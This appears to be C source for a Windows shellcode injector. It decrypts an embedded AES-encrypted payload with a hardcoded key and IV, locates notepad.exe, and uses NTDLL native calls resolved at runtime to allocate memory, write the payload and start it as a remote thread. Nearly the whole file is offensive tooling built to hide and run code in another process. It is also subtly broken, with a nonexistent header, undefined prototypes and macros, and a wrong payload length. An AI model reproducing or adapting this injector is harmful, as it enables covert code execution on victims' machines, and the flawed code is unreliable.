#include <windows.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <string.h>
#include <handBag.h>
#include <psapi.h>
#include <wtsapi32.h>
#include <bcrypt.h>
#include "aes.h"

#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "Wtsapi32.lib")

#include <Windows.h>
#include <stdio.h>

#include <wincrypt.h>
#include <psapi.h>
#pragma comment (lib, "crypt32.lib")
const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

HMODULE getMod(LPCWSTR modName) {
    HMODULE hModule = NULL;

    hModule = GetModuleHandleW(modName);
    if (hModule == NULL) {
    }
    else {
        return hModule;
    }
}



unsigned char pKey[] = {
        0x17, 0x69, 0x9F, 0x2A, 0xF3, 0x88, 0x6E, 0x7B, 0x07, 0x79, 0x50, 0xF8, 0x68, 0x14, 0x8C, 0x5D,
        0x2F, 0x16, 0xBB, 0x6E, 0x67, 0x75, 0xCE, 0xE6, 0x29, 0xF1, 0x52, 0xB0, 0x05, 0xEC, 0xF3, 0x59 };


unsigned char pIv[] = {
        0x35, 0x49, 0xA8, 0x24, 0x92, 0x95, 0xDA, 0x91, 0x84, 0x54, 0x1D, 0x84, 0xB9, 0xC9, 0xBD, 0xE8 };


unsigned char CipherText[] = {
        0x46, 0x94, 0x40, 0x49, 0x2E, 0x9A, 0xE0, 0xBE, 0xD9, 0x42, 0x61, 0xD5, 0xCB, 0xDD, 0xF7, 0x3C,
        0x4F, 0x98, 0x22, 0x77, 0x57, 0xB3, 0xD0, 0x5B, 0x85, 0x27, 0x28, 0x05, 0x55, 0x30, 0x78, 0x2D,
        0x79, 0x96, 0x07, 0xDD, 0xC5, 0x23, 0x36, 0x50, 0x8E, 0x04, 0x11, 0x34, 0xD8, 0xB2, 0x8F, 0xF3,
        0x48, 0x14, 0x73, 0x5F, 0xB2, 0x50, 0x21, 0xD2, 0xAC, 0x9C, 0xBE, 0xA7, 0xD2, 0x74, 0x2D, 0xD4,
        0x8B, 0x4C, 0xF0, 0xF4, 0x6D, 0xEC, 0x68, 0x96, 0x3D, 0x7E, 0x52, 0xCF, 0xB0, 0x1C, 0xA0, 0x51,
        0xFD, 0x23, 0x37, 0x47, 0xB9, 0x3A, 0x2E, 0x34, 0xAE, 0xBA, 0x85, 0x67, 0xE0, 0x90, 0x53, 0x72,
        0x1C, 0x7A, 0x33, 0x46, 0x6A, 0x0B, 0x64, 0x87, 0xE9, 0xC5, 0x3A, 0xF2, 0x5C, 0x5E, 0x56, 0x3B,
        0x93, 0x56, 0xC1, 0x30, 0x6C, 0x68, 0x0D, 0x07, 0x7C, 0xB4, 0x1E, 0xD8, 0x0A, 0x91, 0x66, 0x88,
        0x8D, 0x71, 0x9D, 0x54, 0x76, 0x82, 0x1E, 0xE3, 0x7D, 0x65, 0x4A, 0x55, 0x23, 0xE5, 0x34, 0x3A,
        0xB1, 0x73, 0x72, 0x34, 0xB7, 0x86, 0x96, 0xF3, 0xC2, 0x0B, 0xBA, 0x40, 0x98, 0x7F, 0x25, 0xB0,
        0xC4, 0x10, 0x2F, 0x79, 0xB7, 0x4B, 0x93, 0x4F, 0xA5, 0x48, 0x02, 0x50, 0x30, 0xF8, 0xCC, 0xBA,
        0x55, 0x66, 0x07, 0xBC, 0x75, 0x87, 0x0A, 0xCB, 0xD4, 0x2A, 0xF4, 0xE1, 0x92, 0xF8, 0x4F, 0x8C,
        0x2A, 0xC1, 0x19, 0x19, 0x2C, 0x03, 0x99, 0x51, 0x3B, 0xED, 0x0A, 0x51, 0x76, 0x41, 0x6E, 0x45 };

const UCHAR* payload = CipherText;

void decrypt_payload() {
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, pKey, pIv);
    AES_CBC_decrypt_buffer(&ctx, CipherText, sizeof(CipherText));
}

int FindTarget(const char* procname) {
    int pid = 0;
    WTS_PROCESS_INFOA* proc_info;
    DWORD pi_count = 0;
    if (!WTSEnumerateProcessesA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &proc_info, &pi_count))
        return 0;

    for (int i = 0; i < pi_count; i++) {
        if (lstrcmpiA(procname, proc_info[i].pProcessName) == 0) {
            pid = proc_info[i].ProcessId;
            break;
        }
    }
    return pid;
}


int main(int argc, char* argv[]) {

    NTSTATUS STATUS;
    DWORD dwPID = NULL;
    HANDLE hProc = NULL;
    HMODULE hNTDLL = NULL;
    HANDLE hThread = NULL;
    PVOID rBuffer = NULL;
    SIZE_T writtenbytes = 0;
    DWORD OldProtection = 0;



    SIZE_T payload_len = sizeof(payload);

    info("The memory address of the shellcode is: 0x%p", payload);
    decrypt_payload();

    dwPID = FindTarget("notepad.exe");
    hNTDLL = getMod(L"NTDLL");
    OBJECT_ATTRIBUTES OA = { sizeof(OA),NULL };
    CLIENT_ID CID = { (HANDLE)(dwPID), NULL };

    /* FUNCTION PROTOTYPES */

    NtOpenProcess rovOpen = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    NtCreateThreadEx rovThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    NtAllocateVirtualMemoryEx rovVirtualAlloc = (NtAllocateVirtualMemoryEx)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    NtProtectVirtualMemory rovProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hNTDLL, "NtProtectVirtualMemory");
    NtWriteVirtualMemory rovWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");

    /* BEGIN THE INJECTION */

    STATUS = rovOpen(&hProc, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS != STATUS_SUCCESS) {
        warn("NTOpenProcess, Failed to open process, error 0x%1x\n", STATUS);
        return EXIT_FAILURE;
    }
    STATUS = rovVirtualAlloc(hProc, &rBuffer, 0, &payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
    if (STATUS != STATUS_SUCCESS) {
        warn("NtAllocateVirtualMemoryEx, Failed to allocate memory, error 0x%1x\n", STATUS);
        return EXIT_FAILURE;
    }
    STATUS = rovProtectVirtualMemory(hProc, &rBuffer, &payload_len, PAGE_EXECUTE_READ, &OldProtection);
    if (STATUS_SUCCESS != STATUS) {
        warn("NtProtectVirtualMemory, Failed to change memory address, error 0x%1x\n", STATUS);
        return EXIT_FAILURE;
    }
    okay("[0x%p] [R-X] changed allocated buffer protection to PAGE_EXECUTE_READ [R-X]!", payload);



    if (!WriteProcessMemory(hProc, rBuffer, payload, payload_len, &writtenbytes)) {
        return EXIT_FAILURE;
    }
    STATUS = rovThreadEx(&hThread, PROCESS_ALL_ACCESS, &OA, hProc, rBuffer, NULL, 0, 0, 0, 0, NULL);
    if (STATUS != STATUS_SUCCESS) {
        warn("[-] NTCreateThreadEx, Failed to open process, error 0x%1x\n", STATUS);
        return EXIT_FAILURE;
    }
    okay("Thread has been created! Waiting for thread to finish execution");

    WaitForSingleObject(hThread, INFINITE);
    okay("Execution complete! Awaiting Cleanup!");
    CloseHandle(hThread);

    return 0;
}
